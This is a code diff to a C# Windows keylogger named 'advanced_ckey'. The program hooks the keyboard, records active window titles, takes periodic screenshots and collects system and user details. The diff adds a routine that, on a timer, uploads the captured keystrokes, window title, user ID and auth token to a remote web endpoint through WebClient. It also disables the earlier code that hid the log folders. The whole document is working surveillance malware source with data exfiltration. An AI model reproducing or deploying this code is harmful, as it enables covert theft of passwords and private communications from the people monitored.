@@ -14,6 +14,7 @@ using Microsoft.VisualBasic;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Diagnostics;
+using System.Net;
 
 namespace advanced_ckey
 {
@@ -82,15 +83,21 @@ namespace advanced_ckey
         {
             if (strin != GetActiveWindowTitle())
             {
-                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine;
+                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine;
                 strin = GetActiveWindowTitle();
             }
         }
 
         private void K_Down(string key)
         {
-            textBox1.Text += key;   //writes keystokes into textbox1 calling keyboard class to show keystokes 
+            txtkeylog.Text += key;   //writes keystokes into textbox1 calling keyboard class to show keystokes 
         }
+
+        void send_screenshot_to_file() 
+        {
+        
+        }
+
 
         public void screenshot()  // the method that handles the screenshot
         {
@@ -105,18 +112,34 @@ namespace advanced_ckey
 
                 captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
 
-                captureBitmap.Save(@"C:\MyDir\Screenshot\" + filename , ImageFormat.Jpeg);
+                captureBitmap.Save(@"C:\MyDir\" + filename , ImageFormat.Jpeg);
             }
             catch (Exception)
             {
             }
-        }       
+        }
+
+        public void sendkeylog()
+        {
+            try
+            {
+                string URI = "https://" + Properties.Settings.Default.weburl + "/widgets/Workplace_Keylog_Save?pc_widget_output_method=JSON&";
+                string myParameters = "texts=" + txtkeylog.Text + "&user_id=" + Properties.Settings.Default.user_id + "&window_title=" + strin + "&auth_token=" + Properties.Settings.Default.auth_token;  //strin in the window title field represent the last current window title.
+
+                using (WebClient wc = new WebClient())
+                {
+                    wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
+                    string jsonresponse = wc.UploadString(URI, myParameters);
+                    MessageBox.Show(jsonresponse);
+                }
+            }catch(Exception ex) { MessageBox.Show(ex.Message); }
+        }
 
         public void savetextfile()    // method saving textfile to file explorer
         {
             try
             {
-                File.WriteAllText(@"C:\MyDirr\Keyboard.txt", textBox1.Text);
+                File.WriteAllText(@"C:\MyDirr\Keyboard.txt", txtkeylog.Text);
             }
             catch (Exception)
             {
@@ -124,14 +147,14 @@ namespace advanced_ckey
         }
 
         DirectoryInfo ch;
-
+        DirectoryInfo cb;
 
         private void Form1_Load(object sender, EventArgs e)
         {
            
             try
             {
-                Directory.CreateDirectory(@"C:\MyDir\Screenshot");  // create a diretory for saving the screenshot file
+                Directory.CreateDirectory(@"C:\MyDir");  // create a diretory for saving the screenshot file
                 Directory.CreateDirectory(@"C:\MyDirr");  // create a diretory for saving the screenshot file
                 string filepath;
                 filepath = @"C:\MyDirr\Keyboard.txt"; //create a text file for saving the keylog
@@ -147,34 +170,36 @@ namespace advanced_ckey
             {
             }
 
-            try  //hides keylogger folder
-            {
-                ch = new DirectoryInfo(@"C:\MyDirr");
-                ch.Attributes = FileAttributes.Hidden;
-              //  MessageBox.Show("Hidden");
-            }
-            catch { }
+            //try  //hides keylogger folder
+            //{
+            //    ch = new DirectoryInfo(@"C:\MyDirr");
+            //    ch.Attributes = FileAttributes.Hidden;
+            //  //  MessageBox.Show("Hidden");
+            //}
+            //catch { }
 
-            try  //hides keylogger folder
-            {
-                ch = new DirectoryInfo(@"C:\MyDir");
-                ch.Attributes = FileAttributes.Hidden;
-                //  MessageBox.Show("Hidden");
-            }
-            catch { }
+            //try  //hides keylogger folder
+            //{
+            //    ch = new DirectoryInfo(@"C:\MyDir");
+            //    ch.Attributes = FileAttributes.Hidden;
+            //    //  MessageBox.Show("Hidden");
+            //}
+            //catch { }
 
 
             //try
             //{
 
-            //    ch = new DirectoryInfo(txtFilePath.Text);
+            //    ch = new DirectoryInfo(@"C:\MyDirr");
+            //    cb = new DirectoryInfo(@"C:\MyDir");
             //    ch.Attributes = FileAttributes.Normal;
-            //      MessageBox.Show("Visible");
+            //    cb.Attributes = FileAttributes.Normal;
+            //    MessageBox.Show("Visible");
 
             //}
             //catch { }
 
-
+            sendkeylog_timer.Start();
             keylog_timer.Start();   // write textbox1.text strings into a file
             Sceenshot_timer.Start();  //starts sccenshot timer at every 1 minutes
             keyboardLanguages();  //get the keyboard language {input keyboard language installed}
@@ -183,49 +208,22 @@ namespace advanced_ckey
 
         public void keylog_infomation()
         {
-            var switchExpr = Properties.Settings.Default.browser;
-            switch (switchExpr)
-            {
-                case 0:
-                    {
-                        Properties.Settings.Default.browser = 1;
-                        Properties.Settings.Default.Save();
-                        Properties.Settings.Default.Reload();
-                        break;
-                    }
-
-                case 1:
-                    {
-                        timer4.Start();  // if case 1 clears saved web browser content
-                        break;
-                    }
-
-                case 2:
-                    {
-                        break;
-                    }
-
-                default:
-                    {
-                        break;
-                    }
-            }
-
-            textBox1.Text = DateTime.Now + Environment.NewLine + Environment.NewLine;  // get the present time of the day
+            
+            txtkeylog.Text = DateTime.Now + Environment.NewLine + Environment.NewLine;  // get the present time of the day
 
 
             try
             {
-                textBox1.Text = Environment.NewLine + textBox1.Text + "User Name:             " + Environment.UserName.ToString();  // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "Computer Name:         " + Environment.MachineName.ToString();    // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "OS Version:            " + Environment.OSVersion.ToString();     // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "Runtime:               " + Environment.Version.ToString();      // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "System Root:           " + Environment.SystemDirectory.ToString();    
-                textBox1.Text = textBox1.Text + Environment.NewLine + "User Domain Name:      " + Environment.UserName.ToString();     
-                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine;
+                txtkeylog.Text = Environment.NewLine + txtkeylog.Text + "User Name:             " + Environment.UserName.ToString();  // gives information about the operating system
+                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "Computer Name:         " + Environment.MachineName.ToString();    // gives information about the operating system
+                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "OS Version:            " + Environment.OSVersion.ToString();     // gives information about the operating system
+                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "Runtime:               " + Environment.Version.ToString();      // gives information about the operating system
+                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "System Root:           " + Environment.SystemDirectory.ToString();    
+                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + "User Domain Name:      " + Environment.UserName.ToString();     
+                txtkeylog.Text = txtkeylog.Text + Environment.NewLine + Environment.NewLine;
 
                 K.CreateHook();   // this is the code that takes the keystroke from the keyboard class we created
-                timer1.Start();   // gets active window name and if not wanted delete this line of code
+                activewindowtimer.Start();   // gets active window name and if not wanted delete this line of code
                
             }
             catch (Exception)
@@ -257,6 +255,18 @@ namespace advanced_ckey
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             Application.Exit();
+        }
+
+        private void timer4_Tick(object sender, EventArgs e)
+        {
+           
+            sendkeylog();
+           txtkeylog.Clear();
+        }
+
+        private void sendscreenshot_Tick(object sender, EventArgs e)
+        {
+
         }
     }
 }
